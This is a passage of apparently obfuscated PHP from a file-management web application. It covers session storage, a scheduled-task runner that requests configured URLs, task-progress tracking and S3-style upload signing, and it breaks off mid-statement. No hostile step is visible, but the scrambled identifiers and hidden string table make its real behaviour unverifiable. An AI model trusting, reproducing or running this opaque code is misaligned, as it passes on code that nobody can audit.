explode($_SERVER[Ö][2], gzinflate(substr($_SERVER[Ö][3], 10, -8))); function Model($F†…Êîõ„Ì = '', $A‘à®ÍöÁİ = '', $Aïà·ïóƒÕ = '') { goto B“´óÔÅËŠ; B“´óÔÅËŠ: $b¹®áÚæå› =& $_SERVER[Ç·ÕÂû¼„]; static $fïÆÒË…Ş = array(); $cÀêŠ°ÓÄÁ = strtolower($A‘à®ÍöÁİ . $b¹®áÚæå›[0] . $F†…Êîõ„Ì); goto CÁËÖ¥”îã; CÁËÖ¥”îã: if (isset($fïÆÒË…Ş[$cÀêŠ°ÓÄÁ])) { return $fïÆÒË…Ş[$cÀêŠ°ÓÄÁ]; } if ($F†…Êîõ„Ì) { $F†…Êîõ„Ì = strtoupper($F†…Êîõ„Ì[0]) . substr($F†…Êîõ„Ì, 1); $dƒÖ‹«»³ô = $F†…Êîõ„Ì . $b¹®áÚæå›[1]; if (class_exists($dƒÖ‹«»³ô)) { $fïÆÒË…Ş[$cÀêŠ°ÓÄÁ] = new $dƒÖ‹«»³ô(); return $fïÆÒË…Ş[$cÀêŠ°ÓÄÁ]; } } if (!$Aïà·ïóƒÕ) { $Aïà·ïóƒÕ = $GLOBALS[$b¹®áÚæå›[2]][$b¹®áÚæå›[3]]; } goto A÷¨˜ Å¤; A÷¨˜ Å¤: $fïÆÒË…Ş[$cÀêŠ°ÓÄÁ] = new ModelBase($F†…Êîõ„Ì, $A‘à®ÍöÁİ, $Aïà·ïóƒÕ); return $fïÆÒË…Ş[$cÀêŠ°ÓÄÁ]; goto dÓ‘ôõš•ˆ; dÓ‘ôõš•ˆ: } goto C”ÀšæùÃ…; D„´´‹ºİƒ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto a³Ş…²£; A áÙ™ƒŸ: return $b±Ÿµ‰‚·; goto Bø”ŠàãŞ; a³Ş…²£: $DÖŠ’²â‰² =& $_SERVER[Ö]; static $b±Ÿµ‰‚· = false; if ($b±Ÿµ‰‚·) { return $b±Ÿµ‰‚·; } goto d–†Íç‚ÇŒ; Cí„½ˆˆ‘—: switch ($Aë¹¨ß¸Ô) { case $DÖŠ’²â‰²[17]: self::$handle = Model($DÖŠ’²â‰²[748]); break; case $DÖŠ’²â‰²[749]: self::$handle = new CacheRedis($EÙØ³æ„´, $bæ§Üé…¿Ä); break; case $DÖŠ’²â‰²[750]: self::$handle = new CacheMemcached($EÙØ³æ„´, $bæ§Üé…¿Ä); break; case $DÖŠ’²â‰²[163]: $EÙØ³æ„´[$DÖŠ’²â‰²[75]] = $EÙØ³æ„´[$DÖŠ’²â‰²[75]] . $DÖŠ’²â‰²[1377]; self::$handle = new CacheFile($EÙØ³æ„´, $bæ§Üé…¿Ä); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $b±Ÿµ‰‚· = new self(); goto A áÙ™ƒŸ; d–†Íç‚ÇŒ: $a™¦¯è›ŞÀ = $GLOBALS[$DÖŠ’²â‰²[6]][$DÖŠ’²â‰²[333]]; self::$sessionTime = $a™¦¯è›ŞÀ[$DÖŠ’²â‰²[1374]]; $e¶Š«ÒÆÛÔ = SESSION_ID; goto fÎò˜º…ø; fÎò˜º…ø: $e¶Š«ÒÆÛÔ = _get($GLOBALS, $DÖŠ’²â‰²[1375], $e¶Š«ÒÆÛÔ); if (self::$sessionSign) { } else { if (Cookie::get($e¶Š«ÒÆÛÔ)) { self::$sessionSign = Cookie::get($e¶Š«ÒÆÛÔ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($e¶Š«ÒÆÛÔ, self::$sessionSign, self::$sessionTime); goto fØ¶‰ó›ï§; fØ¶‰ó›ï§: $Aë¹¨ß¸Ô = $a™¦¯è›ŞÀ[$DÖŠ’²â‰²[1376]]; $EÙØ³æ„´ = $a™¦¯è›ŞÀ[$Aë¹¨ß¸Ô]; $bæ§Üé…¿Ä = $a™¦¯è›ŞÀ[$DÖŠ’²â‰²[747]]; goto Cí„½ˆˆ‘—; Bø”ŠàãŞ: } public static function sign($c½Âöùİ»¾ = false) { $c½Âöùİ»¾ && (self::$sessionSign = $c½Âöùİ»¾); self::init(); return self::$sessionSign; } public static function set($BæÛÎ‹·ò¡, $A“Ñ„âó­˜ = false) { self::init(); if (is_array($BæÛÎ‹·ò¡)) { foreach ($BæÛÎ‹·ò¡ as $F›”†êñ—º => $aÈ‘Á«Ò¬·) { array_set_value(self::$data, $F›”†êñ—º, $aÈ‘Á«Ò¬·); } } else { array_set_value(self::$data, $BæÛÎ‹·ò¡, $A“Ñ„âó­˜); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Dßæ™ÒÎĞ¹ = false) { self::init(); if (!$Dßæ™ÒÎĞ¹) { return self::$data; } return array_get_value(self::$data, $Dßæ™ÒÎĞ¹); } public static function remove($BÚ©™…ä´Á) { self::init(); unset(self::$data[$BÚ©™…ä´Á]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ö][752])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eé˜¿ó©œ; fÅçŠ¡º’Ä: while (!0) { self::cacheClear(); if (self::valueGet($c ÎÅ§¥Ğ‰[682]) != $c ÎÅ§¥Ğ‰[83]) { self::valueSet($c ÎÅ§¥Ğ‰[1378], $c ÎÅ§¥Ğ‰[464]); self::log($c ÎÅ§¥Ğ‰[1382]); die; } self::valueSet($c ÎÅ§¥Ğ‰[1378], $c ÎÅ§¥Ğ‰[83]); self::valueSet($c ÎÅ§¥Ğ‰[1379], time()); self::taskRunAll(); sleep(self::valueGet($c ÎÅ§¥Ğ‰[1383])); } goto cØåŞ‹„Ù±; eé˜¿ó©œ: $c ÎÅ§¥Ğ‰ =& $_SERVER[Ö]; if (self::valueGet($c ÎÅ§¥Ğ‰[682]) != $c ÎÅ§¥Ğ‰[83]) { return; } if (self::valueGet($c ÎÅ§¥Ğ‰[1378]) == $c ÎÅ§¥Ğ‰[83]) { $DÌ©ô÷ÎÏ‚ = self::valueGet($c ÎÅ§¥Ğ‰[1379]); if (time() - $DÌ©ô÷ÎÏ‚ > 3600 * 2) { self::restart(); } return; } goto dŠ’‡®Ä©‘; dŠ’‡®Ä©‘: http_close(); self::valueSet($c ÎÅ§¥Ğ‰[1378], $c ÎÅ§¥Ğ‰[83]); Hook::bind($c ÎÅ§¥Ğ‰[1380], $c ÎÅ§¥Ğ‰[1381]); goto fÅçŠ¡º’Ä; cØåŞ‹„Ù±: } public static function restart() { $DÒèìèÂï =& $_SERVER[Ö]; http_close(); self::valueSet($DÒèìèÂï[682], $DÒèìèÂï[464]); sleep(self::valueGet($DÒèìèÂï[1383]) + 5); self::valueSet($DÒèìèÂï[1378], $DÒèìèÂï[464]); self::valueSet($DÒèìèÂï[682], $DÒèìèÂï[83]); } public static function shutdownEvent() { $EÓ—ŒßØÁ‚ =& $_SERVER[Ö]; self::valueSet($EÓ—ŒßØÁ‚[1378], $EÓ—ŒßØÁ‚[464]); self::log($EÓ—ŒßØÁ‚[1384]); } public static function config($aˆßê‡ë¥ì, $cÊ“óÏ½Øã) { $b¸•Ç½ÁØ˜ =& $_SERVER[Ö]; $F‚½æŒØÒ› = 20; $cÊ“óÏ½Øã = intval($cÊ“óÏ½Øã) <= $F‚½æŒØÒ› ? $F‚½æŒØÒ› : intval($cÊ“óÏ½Øã); self::valueSet($b¸•Ç½ÁØ˜[682], $aˆßê‡ë¥ì); self::valueSet($b¸•Ç½ÁØ˜[1383], $cÊ“óÏ½Øã); } private static function taskRunAll() { $EÔ½‚ÉµÜ =& $_SERVER[Ö]; $c½™İÁ´‹Ì = Model($EÔ½‚ÉµÜ[1385])->listData(); $AÛ»Å“äµ» = count($c½™İÁ´‹Ì); for ($Eº¤ñŠÍ‰¤ = 0; $Eº¤ñŠÍ‰¤ < $AÛ»Å“äµ»; $Eº¤ñŠÍ‰¤++) { $dÈĞòîÃ± = $c½™İÁ´‹Ì[$Eº¤ñŠÍ‰¤]; if ($dÈĞòîÃ±[$EÔ½‚ÉµÜ[1386]] != $EÔ½‚ÉµÜ[83]) { continue; } if (!self::taskTimeCheck($dÈĞòîÃ±)) { continue; } self::taskRun($dÈĞòîÃ±); } Hook::trigger($EÔ½‚ÉµÜ[1387]); } private static function taskTimeCheck($f²è•Ã…ƒó) { goto d¹Û¤¢¯÷; BœèÇò‰³•: $f´Ñ©›ËÒ = strtotime($eÒŸÆ˜Œì¦[1388] . $E±Ğ‰áæ‹Û[$eÒŸÆ˜Œì¦[1389]] . $eÒŸÆ˜Œì¦[1390]) - strtotime($eÒŸÆ˜Œì¦[1391]); $CÖš²·šÄ» = time() - strtotime(date($eÒŸÆ˜Œì¦[1392]) . $eÒŸÆ˜Œì¦[1393]); $D§ò†ÎÒ× = $CÖš²·šÄ» >= $f´Ñ©›ËÒ && $CÖš²·šÄ» <= $f´Ñ©›ËÒ + 3600; goto cù‘¼î»»Ò; d¹Û¤¢¯÷: $eÒŸÆ˜Œì¦ =& $_SERVER[Ö]; $E±Ğ‰áæ‹Û = json_decode($f²è•Ã…ƒó[$eÒŸÆ˜Œì¦[186]], !0); $eçÎà×ˆ±š = intval($f²è•Ã…ƒó[$eÒŸÆ˜Œì¦[1379]]); goto BœèÇò‰³•; cù‘¼î»»Ò: switch ($E±Ğ‰áæ‹Û[$eÒŸÆ˜Œì¦[29]]) { case $eÒŸÆ˜Œì¦[1394]: if (time() - $eçÎà×ˆ±š < 3600 * 24 * 30) { return !1; } if ($E±Ğ‰áæ‹Û[$eÒŸÆ˜Œì¦[1394]] == date($eÒŸÆ˜Œì¦[1395]) && $D§ò†ÎÒ×) { return !0; } break; case $eÒŸÆ˜Œì¦[1396]: if (time() - $eçÎà×ˆ±š < 3600 * 24 * 7) { return !1; } $Fèïóˆƒ«ñ = date($eÒŸÆ˜Œì¦[1397]) == 0 ? 7 : date($eÒŸÆ˜Œì¦[1397]); if ($E±Ğ‰áæ‹Û[$eÒŸÆ˜Œì¦[1396]] == $Fèïóˆƒ«ñ && $D§ò†ÎÒ×) { return !0; } break; case $eÒŸÆ˜Œì¦[1389]: if (time() - $eçÎà×ˆ±š < 3600 * 24) { return !1; } if ($D§ò†ÎÒ×) { return !0; } break; case $eÒŸÆ˜Œì¦[1398]: if (time() - $eçÎà×ˆ±š >= floatval($E±Ğ‰áæ‹Û[$eÒŸÆ˜Œì¦[1398]]) * 60) { return !0; } break; default: break; } return !1; goto F‡Î½¯´—­; F‡Î½¯´—­: } public static function taskRun($a¡ôì¡×Ô‰) { goto b‘Œšà¹í; b‘Œšà¹í: $AŠì£Û¸Öµ =& $_SERVER[Ö]; self::log($AŠì£Û¸Öµ[1399] . $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[363]] . $AŠì£Û¸Öµ[1400] . $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[28]] . $AŠì£Û¸Öµ[1401] . $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[1402]]); Model($AŠì£Û¸Öµ[1385])->run($a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[363]]); goto CÆ¹¯—„Àù; CÆ¹¯—„Àù: $A£Ã·ñë×ö = timeFloat(); $bÁˆù¶ˆŸÚ = $AŠì£Û¸Öµ[33]; switch ($a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[29]]) { case $AŠì£Û¸Öµ[291]: $Fğ’ğÔ§ŒŠ = url_request($a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[1402]], $AŠì£Û¸Öµ[212], !1, !1, !1, !1, 5); $bÁˆù¶ˆŸÚ = strlen($Fğ’ğÔ§ŒŠ); break; case $AŠì£Û¸Öµ[211]: $bÁˆù¶ˆŸÚ = Hook::apply($a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[1402]]); default: break; } goto eö«ºë·Î¼; eö«ºë·Î¼: Model($AŠì£Û¸Öµ[1403])->add(array($AŠì£Û¸Öµ[1404] => $AŠì£Û¸Öµ[33], $AŠì£Û¸Öµ[1405] => $AŠì£Û¸Öµ[464], $AŠì£Û¸Öµ[29] => $AŠì£Û¸Öµ[1406] . $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[363]], $AŠì£Û¸Öµ[1407] => json_encode(array($AŠì£Û¸Öµ[28] => $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[28]], $AŠì£Û¸Öµ[1408] => timeFloat() - $A£Ã·ñë×ö, $AŠì£Û¸Öµ[277] => $bÁˆù¶ˆŸÚ)))); self::log($AŠì£Û¸Öµ[1409] . $a¡ôì¡×Ô‰[$AŠì£Û¸Öµ[363]] . $AŠì£Û¸Öµ[1410] . $bÁˆù¶ˆŸÚ); return !0; goto FìÂ•¨Î˜; FìÂ•¨Î˜: } private static function valueGet($d±ƒíóâ£¢) { $eÚª›µø«Ã =& $_SERVER[Ö]; $F«°È‹Ù×Ü = $eÚª›µø«Ã[1411]; $C¾ä«ëÃ®¹ = Model($eÚª›µø«Ã[1412])->get($d±ƒíóâ£¢, $F«°È‹Ù×Ü); if (is_null($C¾ä«ëÃ®¹)) { Model($eÚª›µø«Ã[1412])->set($eÚª›µø«Ã[1383], 10, $F«°È‹Ù×Ü); Model($eÚª›µø«Ã[1412])->set($eÚª›µø«Ã[682], $eÚª›µø«Ã[83], $F«°È‹Ù×Ü); Model($eÚª›µø«Ã[1412])->set($eÚª›µø«Ã[1378], $eÚª›µø«Ã[464], $F«°È‹Ù×Ü); $C¾ä«ëÃ®¹ = Model($eÚª›µø«Ã[1412])->get($d±ƒíóâ£¢, $F«°È‹Ù×Ü); } return $C¾ä«ëÃ®¹; } private static function valueSet($cÂ¸©¦ò„°, $B¸®“­İÙ) { $A²í†ÎèˆŠ =& $_SERVER[Ö]; return Model($A²í†ÎèˆŠ[1412])->set($cÂ¸©¦ò„°, $B¸®“­İÙ, $A²í†ÎèˆŠ[1411]); } protected static function log($b¸óÛ™¨‡Ã) { write_log($b¸óÛ™¨‡Ã, $_SERVER[Ö][1413]); } private static function cacheClear() { $FÄ±Í†”±Õ =& $_SERVER[Ö]; $có†Ş«ÑŒÓ = Model($FÄ±Í†”±Õ[1412])->cacheKey($FÄ±Í†”±Õ[1411]); Cache::clearMemory($có†Ş«ÑŒÓ); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($A¦”›Üç³¦, $A·ƒøÁ¯Å» = '', $c÷Œ”˜½®… = 0, $dä‘Ó¢µÁƒ = '') { goto e–ëÔ“Í; cˆŠ…ã×¯ª: Hook::bind($cÌ²‚éÒ†…[1380], array($this, $cÌ²‚éÒ†…[1422])); Hook::bind($cÌ²‚éÒ†…[1423], array($this, $cÌ²‚éÒ†…[1424])); $this->startAfter(); goto BÉªÚÃº–; BÉªÚÃº–: Hook::trigger($cÌ²‚éÒ†…[1425], $this->task); $this->task[$cÌ²‚éÒ†…[1419]] = timeFloat(); self::valueSet($this->task[$cÌ²‚éÒ†…[363]], $this->task); goto cİ¥æ“§’; e–ëÔ“Í: $cÌ²‚éÒ†… =& $_SERVER[Ö]; if (self::get($A¦”›Üç³¦)) { return; } $this->task = array($cÌ²‚éÒ†…[363] => $A¦”›Üç³¦, $cÌ²‚éÒ†…[1414] => USER_ID, $cÌ²‚éÒ†…[1320] => $dä‘Ó¢µÁƒ, $cÌ²‚éÒ†…[29] => $A·ƒøÁ¯Å», $cÌ²‚éÒ†…[973] => $cÌ²‚éÒ†…[33], $cÌ²‚éÒ†…[971] => $c÷Œ”˜½®…, $cÌ²‚éÒ†…[983] => 0, $cÌ²‚éÒ†…[1415] => 0, $cÌ²‚éÒ†…[1416] => 0, $cÌ²‚éÒ†…[1417] => timeFloat(), $cÌ²‚éÒ†…[1418] => 0, $cÌ²‚éÒ†…[1419] => 0, $cÌ²‚éÒ†…[1420] => 0, $cÌ²‚éÒ†…[1421] => 0, $cÌ²‚éÒ†…[682] => $cÌ²‚éÒ†…[1378]); goto cˆŠ…ã×¯ª; cİ¥æ“§’: } public function end() { goto cĞ¸±ë¬Ì; cĞ¸±ë¬Ì: $aÎÁÁî¤°£ =& $_SERVER[Ö]; if (!$this->task) { return; } if ($this->task[$aÎÁÁî¤°£[1419]]) { self::valueSet($this->task[$aÎÁÁî¤°£[363]], !1); } goto fôÑï³ÌÙ½; E°¢˜°ĞìÆ: Hook::unbind($aÎÁÁî¤°£[1423], array($this, $aÎÁÁî¤°£[1424])); $this->endAfter(); $this->task = !1; goto aŠ¡™êÈµó; fôÑï³ÌÙ½: $a»ÛŒ¥£ç = timeFloat() - $this->task[$aÎÁÁî¤°£[1417]]; self::log($aÎÁÁî¤°£[1426] . $this->task[$aÎÁÁî¤°£[363]] . $aÎÁÁî¤°£[1427] . $a»ÛŒ¥£ç . $aÎÁÁî¤°£[1428]); Hook::unbind($aÎÁÁî¤°£[1380], array($this, $aÎÁÁî¤°£[1422])); goto E°¢˜°ĞìÆ; aŠ¡™êÈµó: } public function update($bğÉìÉ† = 0) { goto Eé™‚µõ®«; Dº‰¸¦ëİµ: $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[983]] += $bğÉìÉ†; $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1418]] = timeFloat(); if ($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[971]]) { if ($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[971]] < $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[983]]) { $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[971]] = $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[983]]; } $FÖĞ™Ã¬ÙŞ = timeFloat() - $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1417]] - $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1420]]; $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1415]] = $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[983]] / $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[971]]; $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1416]] = $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[983]] / $FÖĞ™Ã¬ÙŞ; if ($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1415]] > 0) { $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1421]] = $FÖĞ™Ã¬ÙŞ * (1 - $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1415]]) / $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1415]]; } $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1421]] = $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1421]] <= 0 ? 0 : $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1421]]; } goto Aö“æôÍ˜Ñ; aÁ¢ÌõÏåè: Hook::trigger($e²‡ÛÏ±º†[1432], $AÉÈÚÛ§ÜØ); self::valueSet($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[363]], $AÉÈÚÛ§ÜØ); goto Föï™Ñµ±Ù; a–ØœøóçÈ: $CÙí½Å‡¼‘ = self::get($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[363]]); $F˜ñŠ„ÃĞˆ = $CÙí½Å‡¼‘[$e²‡ÛÏ±º†[682]]; if ($F˜ñŠ„ÃĞˆ == self::STATYS_KILL) { $bšÇŠŞÑê = array($e²‡ÛÏ±º†[1429] => LNG($e²‡ÛÏ±º†[1430]), $e²‡ÛÏ±º†[1025] => !1); Cache::set($e²‡ÛÏ±º†[1431] . $this->task[$e²‡ÛÏ±º†[363]], $bšÇŠŞÑê, 30); $this->end(); die; } else { if ($F˜ñŠ„ÃĞˆ == self::STATYS_STOP) { $D¾İàî×Í = 2; $CÙí½Å‡¼‘[$e²‡ÛÏ±º†[1420]] += $D¾İàî×Í; self::valueSet($AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[363]], $CÙí½Å‡¼‘); sleep($D¾İàî×Í); $this->update(); return; } } goto DÈ¢Û‰§; Aö“æôÍ˜Ñ: $this->updateAfter(); $dµàÀ¯Ú¢ç = 0.2; if (timeFloat() - $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1419]] < $dµàÀ¯Ú¢ç) { return; } goto a–ØœøóçÈ; DÈ¢Û‰§: $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[682]] = $F˜ñŠ„ÃĞˆ ? $F˜ñŠ„ÃĞˆ : $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[682]]; $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1420]] = $CÙí½Å‡¼‘[$e²‡ÛÏ±º†[1420]] ? $CÙí½Å‡¼‘[$e²‡ÛÏ±º†[1420]] : 0; $AÉÈÚÛ§ÜØ[$e²‡ÛÏ±º†[1419]] = timeFloat(); goto aÁ¢ÌõÏåè; Eé™‚µõ®«: $e²‡ÛÏ±º† =& $_SERVER[Ö]; $AÉÈÚÛ§ÜØ =& $this->task; if (!$AÉÈÚÛ§ÜØ) { return; } goto Dº‰¸¦ëİµ; Föï™Ñµ±Ù: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($E®âğĞêÛÍ) { $Eø ‚±à¥ø =& $_SERVER[Ö]; Cache::set($Eø ‚±à¥ø[1431] . $this->task[$Eø ‚±à¥ø[363]], $E®âğĞêÛÍ, 60); return $E®âğĞêÛÍ; } public static function get($C°Ùœ¨‡ëß) { return self::valueGet($C°Ùœ¨‡ëß); } public static function listData() { $DÔãáŠä¸Ú = self::valueGet(); return array_sort_by($DÔãáŠä¸Ú, $_SERVER[Ö][1417], !0); } public static function kill($E£¥Îéé©°) { return self::changeStatus($E£¥Îéé©°, self::STATYS_KILL); } public static function stop($Bƒ¿‹ğù„) { return self::changeStatus($Bƒ¿‹ğù„, self::STATYS_STOP); } public static function restart($fƒÎìÇÏ–¾) { return self::changeStatus($fƒÎìÇÏ–¾, self::STATYS_RUNNING); } public static function killAll() { $dÕ¦Óçğïœ =& $_SERVER[Ö]; $Ağ°ğŞòµ¾ = self::listData(); foreach ($Ağ°ğŞòµ¾ as $a‡ÄÏ‰›æê) { self::kill($a‡ÄÏ‰›æê[$dÕ¦Óçğïœ[363]]); } sleep(2); foreach ($Ağ°ğŞòµ¾ as $a‡ÄÏ‰›æê) { self::valueSet($a‡ÄÏ‰›æê[$dÕ¦Óçğïœ[363]], !1); } } private static function changeStatus($bæ‡ø£œëÊ, $DŠ®…ø‚ƒˆ) { goto D¹òê•ÈÆë; D¹òê•ÈÆë: $aæÈ¤º’Áœ =& $_SERVER[Ö]; $A¼àºáàÈ‚ = self::valueGet($bæ‡ø£œëÊ); if (!$A¼àºáàÈ‚) { return !1; } goto DÁğ´­¢î„; DÁğ´­¢î„: $A¼àºáàÈ‚[$aæÈ¤º’Áœ[682]] = $DŠ®…ø‚ƒˆ; self::valueSet($bæ‡ø£œëÊ, $A¼àºáàÈ‚); self::log($aæÈ¤º’Áœ[1433] . $A¼àºáàÈ‚[$aæÈ¤º’Áœ[363]] . $aæÈ¤º’Áœ[1434] . $DŠ®…ø‚ƒˆ); goto dÇÀåî¾ÅÏ; dÇÀåî¾ÅÏ: return !0; goto bæÊ½Åƒº²; bæÊ½Åƒº²: } public static function valueGet($Dá“Œ„‡•¬ = false) { $E—Êò»–Á =& $_SERVER[Ö]; if ($Dá“Œ„‡•¬) { $f÷±¶Òùº = Model($E—Êò»–Á[395])->where(array($E—Êò»–Á[89] => $Dá“Œ„‡•¬, $E—Êò»–Á[29] => $E—Êò»–Á[1435]))->find(); return $f÷±¶Òùº ? json_decode($f÷±¶Òùº[$E—Êò»–Á[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($E™Ÿ˜Œº…ã = false) { goto EÕœÉÍœœó; EùÅ¯ÉíˆÂ: $dÀ¡ó’•æ¥ = Model($a•Şó–¿î„[395])->where($fº¼Š†¶¹Î)->select(); $dÀ¡ó’•æ¥ = $dÀ¡ó’•æ¥ ? $dÀ¡ó’•æ¥ : array(); foreach ($dÀ¡ó’•æ¥ as $A¾Ñø›õ => $E¥›à•Ôœ©) { $dÀ¡ó’•æ¥[$A¾Ñø›õ] = json_decode($E¥›à•Ôœ©[$a•Şó–¿î„[355]], !0); } goto fË³Ú‘õÚ˜; fË³Ú‘õÚ˜: return $dÀ¡ó’•æ¥; goto bãõ®ø‡î; EÕœÉÍœœó: $a•Şó–¿î„ =& $_SERVER[Ö]; $fº¼Š†¶¹Î = array($a•Şó–¿î„[29] => $a•Şó–¿î„[1435]); if ($E™Ÿ˜Œº…ã) { $fº¼Š†¶¹Î[$a•Şó–¿î„[1414]] = $E™Ÿ˜Œº…ã; } goto EùÅ¯ÉíˆÂ; bãõ®ø‡î: } public static function valueSet($BÄ‡„µÂĞ, $f¤ÑñÜÚÕ) { goto aøğ¿Ùë¦¬; aøğ¿Ùë¦¬: $E¨’™ğ°ÒÜ =& $_SERVER[Ö]; if (!$f¤ÑñÜÚÕ) { return Model($E¨’™ğ°ÒÜ[395])->where(array($E¨’™ğ°ÒÜ[89] => $BÄ‡„µÂĞ, $E¨’™ğ°ÒÜ[29] => $E¨’™ğ°ÒÜ[1435]))->delete(); } $a­å‘Ñ— ã = json_encode($f¤ÑñÜÚÕ); goto CÛ‹À×¹ù†; CÛ‹À×¹ù†: if (!$a­å‘Ñ— ã) { ob_start(); var_dump($f¤ÑñÜÚÕ); $cƒ‰‹œîÜ = ob_get_clean(); self::log($E¨’™ğ°ÒÜ[1436] . json_encode_force($cƒ‰‹œîÜ)); } if (!$BÄ‡„µÂĞ || !$f¤ÑñÜÚÕ[$E¨’™ğ°ÒÜ[363]]) { return !1; } $a–À˜–›¢ = array($E¨’™ğ°ÒÜ[29] => $E¨’™ğ°ÒÜ[1435], $E¨’™ğ°ÒÜ[1414] => USER_ID, $E¨’™ğ°ÒÜ[89] => $BÄ‡„µÂĞ, $E¨’™ğ°ÒÜ[355] => $a­å‘Ñ— ã); goto dŒµ—Š˜ù; dŒµ—Š˜ù: Model($E¨’™ğ°ÒÜ[395])->add($a–À˜–›¢, array(), !0); goto c®¶™íˆø; c®¶™íˆø: } public static function log($dÀÛ„Ú¿) { write_log($dÀÛ„Ú¿, $_SERVER[Ö][1437]); } } goto AïÆ¹×¦ƒ; B¾½µ¦öˆø: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dÂÑˆ‹ŞŒ·) { parent::__construct($dÂÑˆ‹ŞŒ·); $this->signatureVersion($_SERVER[Ö][196]); } public function uploadFormData($c÷ã¿î‡‚, $cŒÓ—‘ ‘ø = 3600) { goto DÖÌ¨Ï·; F÷ë²ô¤Ïã: $D¡“å•¸»— = hash_hmac($EÏÄ‰ˆˆ¬[1129], $eÎ„±¥©”¯, $Cğ¸Ö‚¸³Û, !0); $FÇ¦ÚË§™ = hash_hmac($EÏÄ‰ˆˆ¬[1129], $d£˜ê°Ê‰, $D¡“å•¸»—, !0); $b»–øäó±š = hash_hmac($EÏÄ‰ˆˆ¬[1129], $Eƒå‘İ–˜‰, $FÇ¦ÚË§™); goto AØ·Ñ¥Œ™»; CÑˆÏ«µÈ: $c„Ü¼Œ† = array($this->accessKey, $e‡¥ŠÆà‰, $this->region, $eÎ„±¥©”¯, $d£˜ê°Ê‰); $DñÂ¬óå“ˆ = implode($EÏÄ‰ˆˆ¬[8], $c„Ü¼Œ†); $cÎè•Ä½‹› = array($EÏÄ‰ˆˆ¬[1088] => gmdate($EÏÄ‰ˆˆ¬[1087], strtotime($EÏÄ‰ˆˆ¬[1122])), $EÏÄ‰ˆˆ¬[1089] => array(array($EÏÄ‰ˆˆ¬[1091] => $this->bucket), array($EÏÄ‰ˆˆ¬[1090] => $eÛ‰Á·ö¡†), array($EÏÄ‰ˆˆ¬[1092], $EÏÄ‰ˆˆ¬[1093], $EÏÄ‰ˆˆ¬[33]), array($EÏÄ‰ˆˆ¬[1092], $EÏÄ‰ˆˆ¬[1123], $EÏÄ‰ˆˆ¬[33]), array($EÏÄ‰ˆˆ¬[1092], $EÏÄ‰ˆˆ¬[1124], $EÏÄ‰ˆˆ¬[33]), array($EÏÄ‰ˆˆ¬[1094] => $fÆ¢ÔœÊµ), array($EÏÄ‰ˆˆ¬[1125] => $DñÂ¬óå“ˆ), array($EÏÄ‰ˆˆ¬[1126] => $e¼«ì‹”), array($EÏÄ‰ˆˆ¬[1127] => $fˆ¹àï–), array($EÏÄ‰ˆˆ¬[1128] => $CÄ·¬“Ô­É))); goto f„£õèºæ„; bß§†©Áø: $d£˜ê°Ê‰ = $EÏÄ‰ˆˆ¬[1121]; $CÄ·¬“Ô­É = $cŒÓ—‘ ‘ø . $EÏÄ‰ˆˆ¬[33]; $fÆ¢ÔœÊµ = $EÏÄ‰ˆˆ¬[1086]; goto CÑˆÏ«µÈ; DÖÌ¨Ï·: $EÏÄ‰ˆˆ¬ =& $_SERVER[Ö]; $eÛ‰Á·ö¡† = $EÏÄ‰ˆˆ¬[181]; $e¼«ì‹” = 